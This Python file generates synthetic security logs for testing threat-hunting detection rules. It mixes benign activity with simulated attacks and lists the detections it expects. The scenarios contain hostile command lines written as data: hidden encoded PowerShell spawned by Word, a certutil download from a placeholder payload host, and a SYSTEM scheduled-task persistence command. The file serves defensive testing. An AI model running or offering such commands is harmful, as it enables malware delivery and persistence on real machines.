"""Deterministic SYNTHETIC sample dataset: normal activity plus simulated suspicious behaviour.

All IPs are RFC 5737 documentation ranges or RFC 1918 private ranges; all domains use reserved
.example / .test TLDs. Nothing here is real telemetry or real threat intelligence.
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone

BASE = datetime(2025, 3, 10, 0, 0, 0, tzinfo=timezone.utc)

USERS = {  # user -> (host, ip)
    "alice": ("WS-ALICE", "10.0.1.11"), "bob": ("WS-BOB", "10.0.1.12"), "carol": ("WS-CAROL", "10.0.1.13"),
    "dave": ("WS-DAVE", "10.0.1.14"), "erin": ("WS-ERIN", "10.0.1.15"),
}
BENIGN_DOMAINS = ["www.example.com", "mail.example.com", "updates.example.org", "cdn.example.net", "intranet.example.test"]
BENIGN_PROCS = [("chrome.exe", "explorer.exe", "chrome.exe --type=renderer"), ("outlook.exe", "explorer.exe", "outlook.exe"),
                ("code.exe", "explorer.exe", "code.exe ."), ("teams.exe", "explorer.exe", "teams.exe")]

SAMPLE_NOTE = "SYNTHETIC SAMPLE DATA"


def _e(t: datetime, **kw) -> dict:
    d = {"timestamp": t.strftime("%Y-%m-%dT%H:%M:%SZ"), "dataset": "huntforge-sample"}
    d.update({k: v for k, v in kw.items() if v is not None})
    return d


def generate() -> list[dict]:
    rnd = random.Random(1337)
    ev: list[dict] = []

    # --- Normal activity -------------------------------------------------
    for user, (host, ip) in USERS.items():
        for h in (8, 9, 13):
            t = BASE + timedelta(hours=h, minutes=rnd.randint(0, 40), seconds=rnd.randint(0, 59))
            ev.append(_e(t, source="auth", event_type="authentication", outcome="success", username=user,
                         hostname=host, src_ip=ip, country="US"))
        if rnd.random() < 0.6:  # a typo'd password now and then
            t = BASE + timedelta(hours=8, minutes=rnd.randint(41, 55))
            ev.append(_e(t, source="auth", event_type="authentication", outcome="failure", username=user,
                         hostname=host, src_ip=ip, country="US"))
        for _ in range(60):
            t = BASE + timedelta(minutes=rnd.randint(480, 1020), seconds=rnd.randint(0, 59))
            r = rnd.random()
            if r < 0.5:
                dom = rnd.choice(BENIGN_DOMAINS)
                ev.append(_e(t, source="dns", event_type="dns_query", username=user, hostname=host, src_ip=ip, domain=dom))
            elif r < 0.9:
                ev.append(_e(t, source="netflow", event_type="network_connection", username=user, hostname=host,
                             src_ip=ip, dst_ip=f"192.0.2.{rnd.randint(20, 40)}", dst_port=rnd.choice([443, 443, 80]),
                             bytes_out=rnd.randint(500, 400_000)))
            else:
                p, par, cl = rnd.choice(BENIGN_PROCS)
                ev.append(_e(t, source="edr", event_type="process_create", username=user, hostname=host,
                             process_name=p, parent_process=par, command_line=cl))
    # a legitimately large upload below the exfil threshold (negative control)
    ev.append(_e(BASE + timedelta(hours=15, minutes=2), source="netflow", event_type="network_connection",
                 username="dave", hostname="WS-DAVE", src_ip="10.0.1.14", dst_ip="192.0.2.30", dst_port=443,
                 bytes_out=8_000_000))
    # service account backups
    for h in range(0, 24, 6):
        ev.append(_e(BASE + timedelta(hours=h, minutes=5), source="auth", event_type="authentication", outcome="success",
                     username="svc_backup", hostname="SRV-FILE01", src_ip="10.0.2.5", country="US"))

    # --- Scenario 1: brute force then success against privileged account ------
    atk = "203.0.113.45"
    t0 = BASE + timedelta(hours=2, minutes=14)
    for i in range(14):
        ev.append(_e(t0 + timedelta(seconds=25 * i), source="auth", event_type="authentication", outcome="failure",
                     username=("admin" if i % 3 else "root"), hostname="SRV-WEB01", src_ip=atk, country="RO"))
    t_succ = t0 + timedelta(seconds=25 * 14 + 40)
    ev.append(_e(t_succ, source="auth", event_type="authentication", outcome="success", username="admin",
                 hostname="SRV-WEB01", src_ip=atk, country="RO"))

    # --- Negative control: slow low-volume failures below threshold -------------
    for i in range(4):
        ev.append(_e(BASE + timedelta(hours=5, minutes=17 * i), source="auth", event_type="authentication",
                     outcome="failure", username="erin", hostname="WS-ERIN", src_ip="192.0.2.10", country="DE"))

    # --- Scenario 2: account used from two countries within minutes -------------
    ev.append(_e(BASE + timedelta(hours=9, minutes=3), source="auth", event_type="authentication", outcome="success",
                 username="carol", hostname="VPN-GW01", src_ip="10.0.1.13", country="US"))
    ev.append(_e(BASE + timedelta(hours=9, minutes=21), source="auth", event_type="authentication", outcome="success",
                 username="carol", hostname="VPN-GW01", src_ip="198.51.100.77", country="RO"))

    # --- Scenario 3: account creation + privilege change after the compromise ----
    t1 = t_succ + timedelta(minutes=6)
    ev.append(_e(t1, source="auth", event_type="account_created", username="admin", hostname="SRV-WEB01",
                 message="User account svc_update created", target_user="svc_update"))
    ev.append(_e(t1 + timedelta(minutes=2), source="auth", event_type="group_member_added", username="admin",
                 hostname="SRV-WEB01", message="svc_update added to Administrators", target_user="svc_update",
                 group="Administrators"))

    # --- Scenario 4: suspicious process chains ----------------------------------
    t2 = BASE + timedelta(hours=10, minutes=31)
    ev.append(_e(t2, source="edr", event_type="process_create", username="bob", hostname="WS-BOB",
                 process_name="powershell.exe", parent_process="WINWORD.EXE",
                 command_line="powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"))
    ev.append(_e(t2 + timedelta(seconds=40), source="edr", event_type="process_create", username="bob", hostname="WS-BOB",
                 process_name="certutil.exe", parent_process="powershell.exe",
                 command_line="certutil.exe -urlcache -split -f http://payload.example.test/a.bin C:\\Users\\bob\\AppData\\Local\\Temp\\a.bin"))
    t3 = t_succ + timedelta(minutes=9)
    ev.append(_e(t3, source="edr", event_type="process_create", username="svc_update", hostname="SRV-WEB01",
                 process_name="schtasks.exe", parent_process="cmd.exe",
                 command_line='schtasks.exe /create /tn "WindowsUpdateCheck" /tr C:\\Windows\\Temp\\svc.exe /sc onlogon /ru SYSTEM'))
    ev.append(_e(t3 + timedelta(minutes=1), source="edr", event_type="persistence", username="svc_update",
                 hostname="SRV-WEB01", message="Scheduled task WindowsUpdateCheck created (onlogon, SYSTEM)"))

    # --- Scenario 5: beaconing + large transfer to unusual port ------------------
    c2 = "203.0.113.99"
    t4 = t3 + timedelta(minutes=4)
    ev.append(_e(t4, source="dns", event_type="dns_query", hostname="SRV-WEB01", src_ip="10.0.2.20",
                 domain="update-check.example.test"))
    for i in range(6):
        ev.append(_e(t4 + timedelta(minutes=5 * i + 1), source="netflow", event_type="network_connection",
                     username="svc_update", hostname="SRV-WEB01", src_ip="10.0.2.20", dst_ip=c2, dst_port=4444,
                     bytes_out=2_000 + 300 * i))
    ev.append(_e(t4 + timedelta(minutes=40), source="netflow", event_type="network_connection", username="svc_update",
                 hostname="SRV-WEB01", src_ip="10.0.2.20", dst_ip=c2, dst_port=4444, bytes_out=48_000_000))

    ev.sort(key=lambda e: e["timestamp"])
    return ev


def to_jsonl() -> bytes:
    return ("\n".join(json.dumps(e, sort_keys=True) for e in generate()) + "\n").encode("utf-8")


# Detections the rules are expected to produce on the sample dataset (used by tests and the Rules page).
EXPECTED = [
    {"rule_id": "HF-001", "entity_value": "203.0.113.45"},
    {"rule_id": "HF-002", "entity_value": "203.0.113.45"},
    {"rule_id": "HF-003", "entity_value": "carol"},
    {"rule_id": "HF-004", "entity_value": "admin"},
    {"rule_id": "HF-005", "entity_value": "SRV-WEB01"},
    {"rule_id": "HF-006", "entity_value": "WS-BOB"},
    {"rule_id": "HF-007", "entity_value": "svc_update"},
    {"rule_id": "HF-008", "entity_value": "SRV-WEB01"},
]
# Entities that must NOT be flagged (negative controls).
EXPECTED_ABSENT = [{"rule_id": "HF-001", "entity_value": "192.0.2.10"}]

if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "huntforge_sample.jsonl"
    open(out, "wb").write(to_jsonl())
    print("wrote", out)
